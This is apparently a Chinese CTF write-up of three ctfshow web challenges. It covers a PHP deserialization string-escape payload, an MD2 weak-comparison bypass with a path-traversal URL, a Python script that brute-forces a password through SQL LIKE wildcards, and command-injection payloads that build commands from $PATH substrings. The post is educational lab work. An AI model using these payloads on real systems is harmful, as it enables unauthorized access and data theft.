+++
title = "ctfshow月饼杯"
slug = "ctfshow-mooncake-cup"
description = "刷"
date = "2024-09-06T11:36:52"
lastmod = "2024-09-06T11:36:52"
image = ""
license = ""
categories = ["ctfshow"]
tags = ["mysql"]
+++

# web1_此夜圆 

```php
<?php
error_reporting(0);

class a
{
	public $uname;
	public $password;
	public function __construct($uname,$password)
	{
		$this->uname=$uname;
		$this->password=$password;
	}
	public function __wakeup()
	{
			if($this->password==='yu22x')
			{
				include('flag.php');
				echo $flag;	
			}
			else
			{
				echo 'wrong password';
			}
		}
	}

function filter($string){
    return str_replace('Firebasky','Firebaskyup',$string);
}

$uname=$_GET[1];
$password=1;
$ser=filter(serialize(new a($uname,$password)));
$test=unserialize($ser);
?>
```

emm 咋一看给我黑到了，不知道怎么入手了，仔细回想了一下逃逸字符的漏洞原理不就是绕过`serialize`嘛,这里每次会多两个字符

```php
<?php
class a{
    public $uname='1';
	public $password='yu22x';
}
echo serialize(new a());
//O:1:"a":2:{s:5:"uname";s:1:"1";s:8:"password";s:5:"yu22x";}
```

```python
print(len('";s:8:"password";s:5:"yu22x";}'))
# 30
```

```python
print(15*"Firebasky"+'";s:8:"password";s:5:"yu22x";}')
```

直接打通

# web2_故人心

扫描出来有个`robots.txt`

```
User=agent:   *
Disallow:
Disallow:   hinthint.txt
然后访问得到
Is it particularly difficult to break MD2?!
I'll tell you quietly that I saw the payoad of the author.
But the numbers are not clear.have fun~~~~
xxxxx024452    hash("md2",$b)
xxxxxx48399    hash("md2",hash("md2",$b))
```

```php
<?php
error_reporting(0);
highlight_file(__FILE__);
$a=$_GET['a'];
$b=$_GET['b'];
$c=$_GET['c'];
$url[1]=$_POST['url'];
if(is_numeric($a) and strlen($a)<7 and $a!=0 and $a**2==0){
    $d = ($b==hash("md2", $b)) && ($c==hash("md2",hash("md2", $c)));
    if($d){
             highlight_file('hint.php');
             if(filter_var($url[1],FILTER_VALIDATE_URL)){
                $host=parse_url($url[1]);
                print_r($host); 
                if(preg_match('/ctfshow\.com$/',$host['host'])){
                    print_r(file_get_contents($url[1]));
                }else{
                    echo '差点点就成功了！';
                }
            }else{
                echo 'please give me url!!!';
            }     
    }else{
        echo '想一想md5碰撞原理吧?!';
    }
}else{
    echo '第一个都过不了还想要flag呀?!';
}
```

第一层向下溢出绕过，第二层的话是个弱比较写个脚本绕过

```php
<?php
for($i=0;$i<9999;$i++){
    $b='0e'.$i.'024452';
    if($b==hash("md2",$b)){
        echo $b;
        break;
    }
}
echo "\n";
for($j=0;$j<9999;$j++){
    $c='0e'.$j.'48399';
    if($c==hash("md2",hash("md2", $c))){
        echo $c;
        break;
    }
}
/*
0e652024452
0e603448399
```

`filter_var`这个漏洞也是很好绕过的(后面发现根本不用绕过)

然后先随便下载输个`url`结果给我重定向了，并且还给了提示

```php
<?php 
$flag="flag in /fl0g.txt";
```

```
?a=1e-200&b=0e652024452&c=0e603448399
POST:
url=wo://ctfshow.com/../../../../../fl0g.txt
```

# web3_莫负婵娟

```html
<!--注意：正式上线请删除注释内容！ -->
<!-- username yu22x -->
<!-- SELECT * FROM users where username like binary('$username') and password like binary('$password')-->
```

`like`注入我们可以匹配出密码的位数

在 `LIKE` 中，常用的通配符有两种：

1. **`%`**：表示匹配任意长度的任意字符（包括零个字符）。
2. **`_`**：表示匹配单个任意字符。

所以我们还是写个脚本

```python
import requests

url="http://1f701f35-a402-4f51-a2c9-5967cea01f50.challenge.ctf.show/login.php"
j='_'
for i in range(50):

    data={'username':'yu22x','password':j}
    r=requests.post(url=url,data=data)
    if "wrong username or password" in r.text:
        j+='_'
    else:
        print(len(j))
        break
        
# 32        
```

那我们写个脚本来爆破

```python
import requests
import string

str=string.digits+string.ascii_letters
url="http://1f701f35-a402-4f51-a2c9-5967cea01f50.challenge.ctf.show/login.php"
target=""

for i in range(32):
    for j in str:
        password=target+j+(31-i)*'_'
        data={'username':'yu22x','password':password}
        r=requests.post(url=url,data=data)
        if 'wrong username or password' not in r.text:
            target+=j
            print("\r"+target,end="")
            break

# 67815b0c009ee970fe4014abaa3Fa6A0
```

欧克进入一个RCE页面了

`fuzz`一下发现挺多东西被禁了，但是大写字母没有这里我们直接环境变量RCE即可

```
127.0.0.1;${PATH:5:1}${PATH:2:1}

*被过滤，用?
127.0.0.1;${PATH:14:1}${PATH:5:1} ????.???
```

然后没有回显换到bp里面发包就可以了
